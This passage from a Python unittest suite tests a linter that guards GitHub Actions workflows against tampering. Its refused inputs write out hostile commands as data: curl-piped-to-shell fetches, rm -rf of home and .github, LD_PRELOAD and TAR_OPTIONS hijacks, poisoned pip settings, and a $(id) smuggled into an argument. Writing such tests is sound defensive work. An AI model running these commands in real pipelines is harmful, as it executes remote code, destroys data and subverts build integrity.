        self.addCleanup(self._tmpdir.cleanup)
        self.fx = SccacheFixture(self._tmpdir.name)

    def assertRefused(self, *needles: str) -> list[str]:
        errors = self.fx.errors()
        self.assertTrue(any(all(n in e for n in needles) for e in errors), errors)
        return errors

    def run_refused(self, run: str, *needles: str) -> None:
        with self.subTest(run=run):
            self.fx.workflow("ci.yml", _ci(_block(run)))
            self.assertRefused("step 'P' run:", *needles)

    def run_accepted(self, run: str) -> None:
        with self.subTest(run=run):
            self.fx.workflow("ci.yml", _ci(_block(run)))
            self.assertEqual(self.fx.errors(), [])

    # ---- expression bodies end at the first `}}` outside a literal ------

    def test_close_braces_inside_a_literal_do_not_end_the_expression(self) -> None:
        for run in (
            "echo X=1 >> ${{ '}}' != '' && github.env }}",
            "echo ${{ ('}}' == 'x') || github.path }}",
            "echo ${{ '}}' != '' && env }}",
        ):
            self.run_refused(run, "written only through")

    def test_close_braces_inside_a_literal_outside_run_are_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            _ci(f"steps:\n  - uses: some/action@{_PINNED_SHA}\n    with:\n      t: \"${{{{ '}}}}' && github.env }}}}\"\n"),
        )
        self.assertRefused("with.t", "written only through")

    def test_unterminated_expression_is_refused(self) -> None:
        self.run_refused("echo ${{ github.ref", "outside the expression grammar")
        self.run_refused("echo ${{ 'x }}", "outside the expression grammar")

    # ---- pip: one canonical env-isolated invocation ---------------------

    def test_pip_steered_through_env_or_config_is_refused(self) -> None:
        self.run_refused(
            "PIP_REQUIREMENT=/tmp/evil.txt python -m pip install --isolated --require-hashes "
            f"--only-binary :all: -r {_REQS}",
            "pip environment variable",
        )
        self.run_refused(f"PIP_REQUIREMENT=/tmp/evil.txt {_CANONICAL_PIP}", "pip environment variable")
        self.run_refused(
            "PIP_CONFIG_FILE=/tmp/p.conf python3 -m pip install --isolated --require-hashes "
            f"--only-binary :all: -r {_REQS}",
            "pip environment variable",
        )
        self.run_refused(
            "mkdir -p ~/.config/pip && printf '[global]\\nno-binary = :all:\\n' > ~/.config/pip/pip.conf",
            "pip config file",
        )

    def test_pip_env_key_at_every_scope_is_refused(self) -> None:
        step = f"steps:\n  - name: P\n    run: '{_CANONICAL_PIP}'\n"
        for name, doc in {
            "workflow": _ci(step, top="env:\n  PIP_REQUIREMENT: /tmp/evil.txt\n"),
            "job": _ci("env:\n  PIP_REQUIREMENT: /tmp/evil.txt\n" + step),
            "step": _ci(f"steps:\n  - name: P\n    env:\n      PIP_REQUIREMENT: /tmp/evil.txt\n    run: '{_CANONICAL_PIP}'\n"),
        }.items():
            with self.subTest(name):
                self.fx.workflow("ci.yml", doc)
                self.assertRefused("PIP_REQUIREMENT", "pip environment variable")

    def test_canonical_pip_install_passes(self) -> None:
        self.run_accepted(_CANONICAL_PIP)

    # ---- no runner-file name assembled across a splice ------------------

    def test_runner_file_name_assembled_across_an_expression_is_refused(self) -> None:
        for run in (
            "echo A=b >> \"$GITHUB_${{ 'ENV' }}\"",
            "echo A=b >> $GITHUB_${{ matrix.f }}",
            "echo A=b >> $GITHUB_${{ inputs.f }}",
            "echo A=b >> $GITHUB_${{ env.F }}",
            "echo A=b >> $${{ 'GITHUB_' }}ENV",
        ):
            self.run_refused(run, "splices")

    def test_expression_after_a_plain_word_passes(self) -> None:
        self.run_accepted("cp target/release/ipe${{ matrix.ext }} dist/")
        self.run_accepted("cargo nextest run --partition count:${{ matrix.shard }}/4")

    # ---- defence in depth: shadowing, protected tree, installers --------

    def test_shell_function_or_alias_is_refused(self) -> None:
        for run in (
            "bash() { true; }",
            "sh () { true; }",
            "function bash { true; }",
            "alias bash=true",
            "shopt -s expand_aliases",
        ):
            self.run_refused(run, "shell function or alias")

    def test_write_into_the_protected_tree_is_refused(self) -> None:
        for run in (
            "echo x > .github/ci/requirements.txt",
            "echo x >> \"$GITHUB_WORKSPACE/.github/ci/requirements.txt\"",
            "echo x > \".github/\"ci/requirements.txt",
            "echo x > .GitHub/CI/requirements.txt",
            "cp /tmp/r .github/ci/requirements.txt",
            "cp /tmp/r .github/c*/requirements.txt",
            "sed -i s/a/b/ .github/ci/verify-manifest.py",
            "curl -o .github/ci/strict_yaml.py https://x",
            "tee .github/ci/x < /tmp/y",
            "rm -rf .github",
            "git checkout HEAD~1 -- .github/ci",
            "bash -c 'cp /tmp/r .github/ci/requirements.txt'",
            "bash <<'EOF'\ncp /tmp/r x\nEOF",
        ):
            self.run_refused(run, "writes into .github/ci/")

    def test_executing_or_reading_the_protected_tree_passes(self) -> None:
        self.run_accepted("python3 .github/ci/verify-manifest.py")
        self.run_accepted(".github/ci/artifact-guard.sh")

    def test_free_form_step_naming_the_tree_is_refused(self) -> None:
        for run in (
            "jq . .github/ci/deterministic-checks.json > /tmp/out.json",
            "python3 - <<'PY'\nimport sys\nsys.path.insert(0, \".github/ci\")\n"
            "def main():\n    open(\".github/ci/x\")\nmain()\nPY",
        ):
            with self.subTest(run=run):
                self.fx.workflow("ci.yml", _ci(_block(run)))
                self.assertRefused("step 'P' names", "but is not itself one of")

    def test_installers_outside_pip_hash_checking_are_refused(self) -> None:
        for run in (
            "uv pip install pyyaml",
            "uv tool install ruff",
            "pipx install pyyaml",
            "python3 setup.py install",
            "easy_install pyyaml",
        ):
            self.run_refused(run)

    def test_quote_split_legacy_command_is_refused(self) -> None:
        self.run_refused('echo "::set-""env name=A::b"', "written only through")


_CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
_SETUP_PY = "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
_TOOL = "python3 .github/ci/verify-manifest.py"
_LIVE_PIP = verify_manifest.CANONICAL_PIP_INSTALL


def _job(steps: str, *, runs_on: str = "ubuntu-latest", job: str = "", top: str = "") -> str:
    """A one-job workflow (job id `t`) whose steps are the YAML `steps`."""
    return (
        "name: t\non: push\n" + top + "jobs:\n  t:\n"
        f"    runs-on: {runs_on}\n" + textwrap.indent(job, "    ")
        + "    steps:\n" + textwrap.indent(steps, "      ")
    )


def _block_step(name: str, run: str) -> str:
    """A step whose `run:` is `run` as a YAML literal block."""
    return f"- name: {name}\n  run: |\n" + textwrap.indent(run, "    ") + "\n"


def _run(name: str, run: str, extra: str = "") -> str:
    return f"- name: {name}\n  run: {json.dumps(run)}\n" + textwrap.indent(extra, "  ")


class TestToolOrderingAndClosedShells(unittest.TestCase):
    """The ordering rule: a step naming `.github/ci/**` runs only after
    closed pre-tool shapes, on a fresh GitHub-hosted runner; `shell:` is a
    closed set; pip is judged after quote removal; a shell runs only text
    the check reads."""

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.fx = SccacheFixture(self._tmpdir.name)

    def assertRefused(self, *needles: str) -> list[str]:
        errors = self.fx.errors()
        self.assertTrue(any(all(n in e for n in needles) for e in errors), errors)
        return errors

    def job_refused(self, steps: str, *needles: str, **kw: str) -> None:
        with self.subTest(steps=steps, **kw):
            self.fx.workflow("t.yml", _job(steps, **kw))
            self.assertRefused(*needles)

    def job_accepted(self, steps: str, **kw: str) -> None:
        with self.subTest(steps=steps, **kw):
            self.fx.workflow("t.yml", _job(steps, **kw))
            self.assertEqual(self.fx.errors(), [])

    def run_refused(self, run: str, *needles: str) -> None:
        with self.subTest(run=run):
            self.fx.workflow("ci.yml", _ci(_block(run)))
            self.assertRefused("step 'P' run:", *needles)

    def run_accepted(self, run: str) -> None:
        with self.subTest(run=run):
            self.fx.workflow("ci.yml", _ci(_block(run)))
            self.assertEqual(self.fx.errors(), [])

    # ---- ordering: closed pre-tool shapes, then the tool ----------------

    def test_closed_pre_tool_shapes_then_the_tool_pass(self) -> None:
        self.job_accepted(
            f"- uses: {_CHECKOUT}\n  with:\n    persist-credentials: false\n"
            f"- uses: {_SETUP_PY}\n  with:\n    python-version: '3.12'\n"
            + _run("Pip", _LIVE_PIP)
            + _run("Verify", _TOOL)
            + _run("Guard", ".github/ci/artifact-guard.sh")
        )

    def test_helper_call_after_a_build_step_passes(self) -> None:
        self.job_accepted(
            f"- uses: {_CHECKOUT}\n"
            + _run("Build", "cargo build")
            + _run("Env", 'bash "$GITHUB_WORKSPACE/.github/ci/github-env.sh" CI_JOB_BIN_NAME ipe')
        )

    def test_tool_after_a_free_form_step_is_refused(self) -> None:
        for pre in (
            "echo hi",
            "cargo build",
            "d=.git; cp /tmp/e ${d}hub/ci/verify-manifest.py",
            "cd .github; cp /tmp/e ci/verify-manifest.py",
            "python3 -c 'open(\".github/ci/x\",\"w\")'",
            "tar xf /tmp/evil.tar",
            "git checkout HEAD~1 -- .",
            "find . -name x -exec cp /tmp/e {} ';'",
        ):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Pre", pre) + _run("Verify", _TOOL),
                "step 'Verify'", "after step 'Pre'", "outside the closed pre-tool shapes",
            )

    def test_tool_after_an_action_outside_the_closed_shapes_is_refused(self) -> None:
        for pre in (
            "- name: Pre\n  uses: actions/checkout@v4\n",
            f"- name: Pre\n  uses: actions/checkout@{_PINNED_SHA}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    ref: evil\n",
            f"- name: Pre\n  uses: {_SETUP_PY}\n  with:\n    python-version: '3.12'\n    cache: pip\n",
            f"- name: Pre\n  uses: some/action@{_PINNED_SHA}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  env:\n    PYTHONPATH: /tmp\n",
        ):
            self.job_refused(pre + _run("Verify", _TOOL), "step 'Verify'", "after step 'Pre'")

    def test_tool_runner_outside_fresh_hosted_labels_is_refused(self) -> None:
        for runs_on in (
            "self-hosted", "'${{ matrix.os }}'", "[self-hosted, linux]", "my-ubuntu-latest",
            "windows-latest", "macos-latest", "ubuntu-latest-evil",
        ):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                "not one literal GitHub-hosted Ubuntu label", runs_on=runs_on,
            )

    def test_tool_job_with_a_container_or_services_is_refused(self) -> None:
        for key in ("container", "services"):
            body = "container: node@sha256:" + "0" * 64 + "\n" if key == "container" else (
                "services:\n  db:\n    image: postgres@sha256:" + "0" * 64 + "\n"
            )
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), f"with a job {key}:", job=body,
            )

    def test_tool_under_a_working_directory_is_refused(self) -> None:
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "working-directory: sub\n"),
            "under a working-directory:",
        )
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
            "job defaults.run.working-directory", job="defaults:\n  run:\n    working-directory: sub\n",
        )
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
            "workflow defaults.run.working-directory", top="defaults:\n  run:\n    working-directory: sub\n",
        )

    def test_tool_under_an_interpreter_steering_env_is_refused(self) -> None:
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  PYTHONPATH: /tmp/evil\n"),
            "step 'Verify'", "PYTHONPATH",
        )
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), "job env", "PYTHONPATH",
            job="env:\n  PYTHONPATH: /tmp/evil\n",
        )
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), "workflow env", "LD_PRELOAD",
            top="env:\n  LD_PRELOAD: /tmp/evil.so\n",
        )

    def test_tool_job_rust_env_passes(self) -> None:
        self.job_accepted(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  GH_TOKEN: x\n"),
            job="env:\n  REPO: x\n",
            top="env:\n  CARGO_TERM_COLOR: always\n  CARGO_INCREMENTAL: '0'\n",
        )

    # ---- a step naming the tree is itself a closed shape ----------------

    def test_tool_step_that_is_not_a_pure_tool_run_is_refused(self) -> None:
        for run in (
            "./tools/x.sh; python3 .github/ci/verify-manifest.py",
            "make\npython3 .github/ci/verify-manifest.py",
            "curl -s https://e.x/p | python3 -\npython3 .github/ci/verify-manifest.py",
            "python3 -c \"open('.git'+'hub/ci/verify-manifest.py','w').write('')\"\n"
            "python3 .github/ci/verify-manifest.py",
            "python3 .github/ci/verify-manifest.py ${{ needs.a.outputs.b }}",
            "python3 .github/ci/verify-manifest.py\n-rf",
            "python3 .github/ci/verify-manifest.py\nrm -rf ~",
            "python3 .github/ci/nope.py",
            "python3 .github/ci/artifact-guard.sh",
            "bash .github/ci/verify-manifest.py",
            "python3 .github/ci/../ci/verify-manifest.py",
            "python3 .github/ci/verify-manifest.py > /tmp/o",
            "python3 .github/ci/verify-manifest.py --x=$(id)",
        ):
            with self.subTest(run=run):
                self.fx.workflow("t.yml", _job(f"- uses: {_CHECKOUT}\n" + _block_step("Verify", run)))
                self.assertRefused("step 'Verify' names", "but is not itself one of")

    def test_free_form_step_before_the_tool_is_refused(self) -> None:
        for pre in (
            "curl -s https://e.x/p | python3 -",
            "python3 -c \"open('.git'+'hub/ci/verify-manifest.py','w').write('')\"",
            "make",
        ):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _block_step("Pre", pre) + _run("Verify", _TOOL),
                "step 'Verify'", "after step 'Pre'",
            )

    def test_pure_tool_runs_pass(self) -> None:
        for run in (
            "python3 .github/ci/verify-manifest.py",
            "python3 .github/ci/verify-manifest.py -v --strict",
            "bash .github/ci/artifact-guard.sh",
            ".github/ci/artifact-guard.sh",
        ):
            self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", run))

    # ---- env is one allowlist ------------------------------------------

    def test_env_outside_the_tool_allowlist_is_refused(self) -> None:
        for steps, kw, needles in (
            (
                f"- uses: {_SETUP_PY}\n  with:\n    python-version: '3.12'\n  env:\n    TAR_OPTIONS: --to-command=sh\n"
                + _run("Verify", _TOOL),
                {}, ("step 'Verify'", "after step"),
            ),
            (
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                {"job": "env:\n  TAR_OPTIONS: --to-command=sh\n"}, ("job env", "TAR_OPTIONS"),
            ),
            (
                f"- uses: {_CHECKOUT}\n- uses: {_CHECKOUT}\n  env:\n    XDG_CONFIG_HOME: /tmp/x\n"
                + _run("Verify", _TOOL),
                {}, ("step 'Verify'", "after step"),
            ),
            (
                f"- uses: {_CHECKOUT}\n" + _run("Pip", _LIVE_PIP, "env:\n  OPENSSL_CONF: /tmp/o\n")
                + _run("Verify", _TOOL),
                {}, ("step 'Pip'", "not itself one of"),
            ),
            (
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  OPENSSL_CONF: /tmp/o\n"),
                {}, ("step 'Verify'", "OPENSSL_CONF"),
            ),
            (
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  GCONV_PATH: /tmp/g\n"),
                {}, ("step 'Verify'", "GCONV_PATH"),
            ),
            (
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                {"job": "env:\n  CARGO_TERM_COLOR: always\n"}, ("job env", "CARGO_TERM_COLOR"),
            ),
            (
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  gh_token: x\n"),
                {}, ("step 'Verify'", "gh_token"),
            ),
        ):
            self.job_refused(steps, *needles, **kw)

    # ---- no path spelling or working directory reaches the tree unnamed --

    def test_backslash_tree_path_on_windows_is_refused(self) -> None:
        steps = f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 .github\\ci\\verify-manifest.py", "shell: pwsh\n")
        self.job_refused(steps, "step 'Verify' names", "but is not itself one of", runs_on="windows-latest")
        self.job_refused(steps, "not one literal GitHub-hosted Ubuntu label", runs_on="windows-latest")

    def test_working_directory_with_a_github_component_is_refused(self) -> None:
        for wd in (".github", "./.GitHub/", "sub/../.github", ".github\\ci", "${{ env.D }}", "$HOME"):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py", f"working-directory: {json.dumps(wd)}\n"),
                "step 'Verify' working-directory:", "refused",
            )
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py"),
            "job 't' defaults.run.working-directory '.github'", job="defaults:\n  run:\n    working-directory: .github\n",
        )
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py"),
            "t.yml defaults.run.working-directory '.github'", top="defaults:\n  run:\n    working-directory: .github\n",
        )

    def test_working_directory_symlinked_to_the_tree_is_refused(self) -> None:
        os.symlink(".github", os.path.join(self.fx.repo, "gh"))
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py", "working-directory: gh\n"),
            "resolves on disk to a .github component",
        )

    def test_plain_working_directory_outside_a_tool_job_passes(self) -> None:
        self.job_accepted(_run("Build", "cargo build", "working-directory: src\n"))

    def test_composite_step_naming_the_tree_is_refused(self) -> None:
        self.fx.composite(
            "w", "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: python3 .github/ci/verify-manifest.py\n",
        )
        self.job_refused(f"- uses: {_CHECKOUT}\n- uses: ./.github/actions/w\n", "a composite step runs wherever")

    def test_regex_dot_star_is_not_a_tree_reference(self) -> None:
        self.job_accepted(_run("Build", "cargo build") + _run("Grep", "grep -E '.*/ci' x.txt"))

    # ---- shell: is a closed set ----------------------------------------

    def test_step_shell_outside_the_closed_set_is_refused(self) -> None:
        for shell in ("bash -c 'cp /tmp/e .github/ci/x; bash {0}'", "python {0}", "sh", "bash {0}", "cmd"):
            with self.subTest(shell=shell):
                self.fx.workflow("ci.yml", _ci(f"steps:\n  - name: P\n    shell: {shell!r}\n    run: echo hi\n"))
                self.assertRefused("shell:", "is one of")

    def test_defaults_shell_outside_the_closed_set_is_refused(self) -> None:
        step = "steps:\n  - name: P\n    run: echo hi\n"
        self.fx.workflow("ci.yml", _ci("defaults:\n  run:\n    shell: sh\n" + step))
        self.assertRefused("defaults.run.shell", "is one of")
        self.fx.workflow("ci.yml", _ci(step, top="defaults:\n  run:\n    shell: python {0}\n"))
        self.assertRefused("defaults.run.shell", "is one of")

    def test_closed_step_shells_pass(self) -> None:
        for shell in ("bash", "pwsh", "powershell"):
            with self.subTest(shell=shell):
                self.fx.workflow("ci.yml", _ci(f"steps:\n  - name: P\n    shell: {shell}\n    run: echo hi\n"))
                self.assertEqual(self.fx.errors(), [])

    # ---- pip is matched after quote removal -----------------------------

    def test_quote_split_pip_is_refused(self) -> None:
        for run in (
            'python3 -m p""ip install evil',
            'python3 -m "p"ip install evil',
            "python3 -m p''ip install evil",
            "python3 -m pi\\p install evil",
        ):
            self.run_refused(run, "pip")

    # ---- a shell runs only text the check reads -------------------------

    def test_shell_program_the_check_cannot_read_is_refused(self) -> None:
        for run in (
            "bash -xc 'cp /tmp/e .github/ci/x'",
            "bash -o pipefail -c 'cp /tmp/e .github/ci/x'",
            "bash -e -o errexit -c 'cp /tmp/e .github/ci/x'",
            "bash <<< 'cp /tmp/e .github/ci/x'",
            "echo x | bash",
            "curl https://x | sh",
            "cat .github/ci/x | sh",
            "cat -n f | sh",
            "bash +c 'x'",
            "bash -o",
            "bash -c",
            "bash --rcfile /tmp/r -c 'echo'",
        ):
            self.run_refused(run, "writes into .github/ci/")

    def test_wrapper_with_flags_or_xargs_is_refused(self) -> None:
        for run in (
            "env -u python3 cp /tmp/e .github/ci/x",
            "exec -a python3 cp /tmp/e .github/ci/x",
            "env -S 'cp /tmp/e .github/ci/x'",
            "ls | xargs cp -t .github/ci",
            "nice -n 5 cp /tmp/e .github/ci/x",
            "timeout 5 cp /tmp/e .github/ci/x",
        ):
            self.run_refused(run, "writes into .github/ci/")

    def test_brace_spelled_tree_write_is_refused(self) -> None:
        for run in (
            "cp /tmp/e {.github,x}/ci/y",
            "cp /tmp/e .{github,x}/ci/y",
            "cp /tmp/e .gi{t,x}hub/ci/y",
            "cp /tmp/e .github/{ci,x}/y",
        ):
            self.run_refused(run, "writes into .github/ci/")

    def test_shell_programs_the_check_reads_pass(self) -> None:
        for run in (
            "cat install.sh | sh",
            "a || bash -c 'echo ok'",
            "# see `curl https://x | sh` in the docs\necho ok",
            "bash -euxo pipefail -c 'echo ok'",
            "bash scripts/x.sh",
            "echo {a,b}/ci",
        ):
            self.run_accepted(run)

    # ---- a tool run's words are bash's words ------------------------------

    # Characters bash keeps inside a word that a looser splitter (`str.split`,
    # `\s`) would read as a blank.
    NON_BLANKS = ("\r", "\v", "\f", "\x85", " ", "\x1c", "\xa0")

    def test_tool_run_split_on_a_non_bash_blank_is_refused(self) -> None:
        for ch in self.NON_BLANKS:
            for run in (
                f"python3{ch}.github/ci/verify-manifest.py",
                f"python3 .github/ci/verify-manifest.py{ch}",
                f"{ch}python3 .github/ci/verify-manifest.py",
                f"python3 .github/ci/verify-manifest.py{ch}-v",
            ):
                with self.subTest(run=run):
                    self.assertIsNone(verify_manifest.ToolRunText.parse(run))
                    self.assertIsNone(verify_manifest.ToolRun.parse(run, self.fx.root))
                    self.fx.workflow("t.yml", _job(f"- uses: {_CHECKOUT}\n" + _run("Verify", run)))
                    self.assertRefused("step 'Verify' names", "but is not itself one of")

    def test_tool_run_words_split_on_space_and_tab_only(self) -> None:
        text = verify_manifest.ToolRunText.parse(" \tpython3 \t.github/ci/verify-manifest.py\t-v \n")
        self.assertIsNotNone(text)
        self.assertEqual(text.words if text else (), ("python3", ".github/ci/verify-manifest.py", "-v"))
        self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3\t.github/ci/verify-manifest.py"))

    def test_shell_lex_blanks_are_bash_blanks(self) -> None:
        import shutil
        import subprocess

        bash = shutil.which("bash")
        if bash is None:
            self.skipTest("bash is not installed")
        # Every character bash could plausibly split on: ASCII controls,
        # every whitespace, and the non-ASCII spaces. Newline ends a command
        # instead, so it is not a word blank.
        candidates = {chr(i) for i in range(1, 0x80) if not chr(i).isprintable() or chr(i).isspace()}
        candidates |= {" ", "\x85", "\xa0", " ", " ", " ", " ", "　"}
        candidates.discard("\n")
        splits = set()
        for ch in sorted(candidates):
            out = subprocess.run(
                [bash, "--norc", "--noprofile", "-c", f"f() {{ echo $#; }}; f a{ch}b"],
                capture_output=True, text=True, check=False,
            ).stdout.strip()
            if out == "2":
                splits.add(ch)
        self.assertEqual(splits, set(verify_manifest.shell_lex.BLANKS))

    # ---- a verdict-bearing step cannot be masked -------------------------

    def test_masked_tool_step_is_refused(self) -> None:
        for extra, key in (
            ("if: always()\n", "if:"),
            ("if: false\n", "if:"),
            ("if: ${{ github.event_name == 'push' }}\n", "if:"),
            ("continue-on-error: true\n", "continue-on-error:"),
            ("continue-on-error: false\n", "continue-on-error:"),
            ("continue-on-error: ${{ true }}\n", "continue-on-error:"),
        ):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, extra),
                "step 'Verify' names", "but is not itself one of", f"with {key}",
            )

    def test_advisory_tool_admits_only_literal_continue_on_error_true(self) -> None:
        self.job_accepted(
            f"- uses: {_CHECKOUT}\n"
            + _run("Classify", "python3 .github/ci/release_only.py", "continue-on-error: true\n")
        )
        for extra in ("continue-on-error: ${{ true }}\n", "continue-on-error: 'true'\n", "if: always()\n"):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Classify", "python3 .github/ci/release_only.py", extra),
                "step 'Classify' names", "but is not itself one of",
            )

    def test_masked_setup_step_before_the_tool_is_refused(self) -> None:
        for pre in (
            f"- name: Pre\n  uses: {_CHECKOUT}\n  if: false\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  continue-on-error: true\n",
            f"- name: Pre\n  uses: {_SETUP_PY}\n  if: false\n  with:\n    python-version: '3.12'\n",
            f"- name: Pre\n  uses: {_SETUP_PY}\n  continue-on-error: true\n  with:\n    python-version: '3.12'\n",
            _run("Pre", _LIVE_PIP, "continue-on-error: true\n"),
            _run("Pre", _LIVE_PIP, "if: false\n"),
        ):
            self.job_refused(pre + _run("Verify", _TOOL), "step 'Verify'", "after step 'Pre'")

    # ---- a verdict-bearing job cannot be masked ---------------------------

    _OUTPUT = "python3 .github/ci/deterministic_checks_output.py"
    _ADVISORY = "python3 .github/ci/release_only.py"
    _JOB_MASKS = (
        ("if: always()\n", "if:"),
        ("if: false\n", "if:"),
        ("if: true\n", "if:"),
        ("if: ${{ github.event_name == 'push' }}\n", "if:"),
        ("continue-on-error: true\n", "continue-on-error:"),
        ("continue-on-error: false\n", "continue-on-error:"),
        ("continue-on-error: ${{ true }}\n", "continue-on-error:"),
    )

    def test_job_level_masking_on_a_verdict_job_is_refused(self) -> None:
        for job, key in self._JOB_MASKS:
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                f"with a job {key}", "verify-manifest.py", "reports success", job=job,
            )

    def test_job_level_masking_on_an_advisory_job_is_refused(self) -> None:
        # Its outputs steer other jobs' `if:`; a skipped job leaves them unset.
        for job, key in self._JOB_MASKS:
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Classify", self._ADVISORY, "continue-on-error: true\n"),
                f"with a job {key}", job=job,
            )

    def test_job_level_if_with_an_output_and_a_verdict_tool_is_refused(self) -> None:
        self.job_refused(
            f"- uses: {_CHECKOUT}\n" + _run("Emit", self._OUTPUT) + _run("Verify", _TOOL),
            "with a job if:", "verify-manifest.py", job="if: always()\n",
        )

    def test_output_tool_terminal_job_admits_a_job_if(self) -> None:
        for job in ("if: github.event_name == 'pull_request'\n", "if: ${{ failure() }}\n"):
            self.job_accepted(
                f"- uses: {_CHECKOUT}\n  with:\n    sparse-checkout: .github/ci\n"
                + _run("Emit", self._OUTPUT) + _run("Act", "echo acting"),
                job=job,
            )

    def test_output_tool_job_refuses_continue_on_error(self) -> None:
        for job in ("continue-on-error: true\n", "continue-on-error: ${{ true }}\n"):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Emit", self._OUTPUT),
                "with a job continue-on-error:", job=job,
            )

    def test_output_tool_step_admits_no_step_masking(self) -> None:
        for extra in ("if: always()\n", "continue-on-error: true\n"):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Emit", self._OUTPUT, extra),
                "step 'Emit' names", "but is not itself one of",
            )

    def test_masked_output_job_that_another_job_needs_is_refused(self) -> None:
        self.fx.workflow(
            "t.yml",
            "name: t\non: push\njobs:\n"
            "  t:\n    runs-on: ubuntu-latest\n    if: always()\n    steps:\n"
            f"      - uses: {_CHECKOUT}\n"
            f"      - name: Emit\n        run: {self._OUTPUT}\n"
            "  u:\n    runs-on: ubuntu-latest\n    needs: [t]\n    steps:\n"
            "      - name: Echo\n        run: echo hi\n",
        )
        self.assertRefused("job 't'", "job(s) ['u'] need it", "skips its dependents")

    def test_verdict_job_needing_a_skipped_job_is_refused(self) -> None:
        self.fx.workflow(
            "t.yml",
            "name: t\non: push\njobs:\n"
            "  s:\n    runs-on: ubuntu-latest\n    if: false\n    steps:\n"
            "      - name: Echo\n        run: echo hi\n"
            "  t:\n    runs-on: ubuntu-latest\n    needs: [s]\n    steps:\n"
            f"      - uses: {_CHECKOUT}\n"
            f"      - name: Verify\n        run: {_TOOL}\n",
        )
        self.assertRefused("job 't'", "with needs", "['s']")

    def test_verdict_job_needing_a_job_that_needs_a_skipped_job_is_refused(self) -> None:
        self.fx.workflow(
            "t.yml",
            "name: t\non: push\njobs:\n"
            "  u:\n    runs-on: ubuntu-latest\n    if: false\n    steps:\n"
            "      - name: Echo\n        run: echo hi\n"
            "  s:\n    runs-on: ubuntu-latest\n    needs: [u]\n    steps:\n"
            "      - name: Echo\n        run: echo hi\n"
            "  t:\n    runs-on: ubuntu-latest\n    needs: [s]\n    steps:\n"
            f"      - uses: {_CHECKOUT}\n"
            f"      - name: Verify\n        run: {_TOOL}\n",
        )
        self.assertRefused("job 't'", "with needs", "['s']")

    def test_advisory_job_needing_a_skipped_job_is_refused(self) -> None:
        self.fx.workflow(
            "t.yml",
            "name: t\non: push\njobs:\n"
            "  s:\n    runs-on: ubuntu-latest\n    if: false\n    steps:\n"
            "      - name: Echo\n        run: echo hi\n"
            "  t:\n    runs-on: ubuntu-latest\n    needs: [s]\n    steps:\n"
            f"      - uses: {_CHECKOUT}\n"
            "      - name: Classify\n        run: python3 .github/ci/release_only.py\n",
        )
        self.assertRefused("job 't'", "with needs", "['s']")

    def test_terminal_output_job_admits_needs(self) -> None:
        # The one role whose job admits a job `if:` also admits `needs:`, as
        # long as no job needs it in turn.
        self.fx.workflow(
            "t.yml",
            "name: t\non: push\njobs:\n"
            "  s:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - name: Echo\n        run: echo hi\n"
            "  t:\n    runs-on: ubuntu-latest\n    needs: [s]\n    if: failure()\n    steps:\n"
            f"      - uses: {_CHECKOUT}\n        with:\n          sparse-checkout: .github/ci\n"
            f"      - name: Emit\n        run: {self._OUTPUT}\n",
        )
        self.assertEqual(self.fx.errors(), [])

    # A VERDICT or ADVISORY job admits no `needs:` at all (see `ToolJob`'s
    # docstring): any non-empty `needs:` on such a job is refused whether or
    # not its ancestor chain carries an `if:`.

    # ---- the tool job's shape: closed keys, a literal budget --------------

    def test_tool_job_key_outside_the_allowlist_is_refused(self) -> None:
        for job, key in (
            ("strategy:\n  matrix:\n    x: [1, 2]\n", "strategy"),
            ("strategy:\n  fail-fast: false\n", "strategy"),
            ("concurrency: t\n", "concurrency"),
            ("environment: prod\n", "environment"),
        ):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                f"with a job {key}:", "outside the tool job keys", job=job,
            )

    def test_tool_job_timeout_must_be_a_positive_integer_literal(self) -> None:
